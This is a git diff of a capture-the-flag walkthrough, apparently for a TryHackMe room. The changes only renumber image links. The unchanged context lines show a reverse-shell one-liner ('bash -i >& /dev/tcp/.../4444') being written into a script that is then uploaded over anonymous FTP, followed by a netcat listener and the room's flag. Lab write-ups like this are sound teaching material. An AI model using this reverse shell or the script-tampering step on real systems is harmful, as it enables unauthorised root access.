@@ -29,7 +29,7 @@ anonymous
 ls
 ```
 
-![](../.gitbook/assets/image%20%2863%29.png)
+![](../.gitbook/assets/image%20%2865%29.png)
 
 {% hint style="success" %}
 public
@@ -45,7 +45,7 @@ cd public
 ls
 ```
 
-![](../.gitbook/assets/image%20%2858%29.png)
+![](../.gitbook/assets/image%20%2860%29.png)
 
 {% hint style="success" %}
 backup.sh
@@ -62,7 +62,7 @@ quit
 cat shoppinglist.txt
 ```
 
-![](../.gitbook/assets/image%20%288%29.png)
+![](../.gitbook/assets/image%20%289%29.png)
 
 {% hint style="success" %}
 The Polar Express
@@ -79,7 +79,7 @@ cd public
 get backup.sh
 ```
 
-![](../.gitbook/assets/image%20%2854%29.png)
+![](../.gitbook/assets/image%20%2856%29.png)
 
 ```text
 vi backup.sh
@@ -87,13 +87,13 @@ vi backup.sh
 bash -i >& /dev/tcp/10.14.4.204/4444 0>&1
 ```
 
-![](../.gitbook/assets/image%20%2816%29.png)
+![](../.gitbook/assets/image%20%2817%29.png)
 
 ```text
 put backup.sh
 ```
 
-![](../.gitbook/assets/image%20%285%29.png)
+![](../.gitbook/assets/image%20%286%29.png)
 
 ```text
 nc -lnp 4444
@@ -101,7 +101,7 @@ cd /root
 cat flag.txt
 ```
 
-![](../.gitbook/assets/image%20%286%29.png)
+![](../.gitbook/assets/image%20%287%29.png)
 
 {% hint style="success" %}
 THM{even\_you\_can\_be\_santa}
